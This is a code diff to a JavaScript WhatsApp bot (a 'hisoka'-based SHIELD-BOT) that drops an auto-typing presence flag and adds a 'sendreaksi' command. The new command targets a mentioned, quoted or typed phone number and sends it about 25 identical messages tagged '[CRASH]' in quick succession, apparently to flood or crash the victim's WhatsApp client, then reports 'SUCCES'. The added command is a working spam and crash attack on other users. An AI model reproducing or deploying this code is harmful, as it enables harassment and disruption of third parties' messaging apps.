@@ -23,7 +23,6 @@ const { color, bgcolor } = require('./lib/color')
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
 
 // read database
-let autovn = true
 let tebaklagu = db.data.game.tebaklagu = []
 let _family100 = db.data.game.family100 = []
 let kuismath = db.data.game.math = []
@@ -118,9 +117,6 @@ module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
         if (!hisoka.public) {
             if (!m.key.fromMe) return
         }
-   if (autovn){
-          hisoka.updatePresence(m.chat, Presence.composing)                 
-                   }
         // Push Message To Console && Auto Read
         if (m.message) {
         console.log('\x1b[1;34m~\x1b[1;37m>', '[\x1b[1;33mCMD\x1b[1;37m]', time,              color(`${prefix + command} [${args.length}]`, 'cyan'), 'from', color(m.      pushName), 'in', color(groupName, 'orange'))
@@ -3481,6 +3477,38 @@ Prefix : ${prefix}
                             hisoka.send5ButLoc(m.chat, anu, "@SHIELD-BOT", fs.readFileSync('./menu1.jpeg'), btn)
                      }
             break
+case 'sendreaksi' : {
+                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+                a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+                await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
+m.reply(`SUCCES`)
+                await sleep(20)
+            }
+                break
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
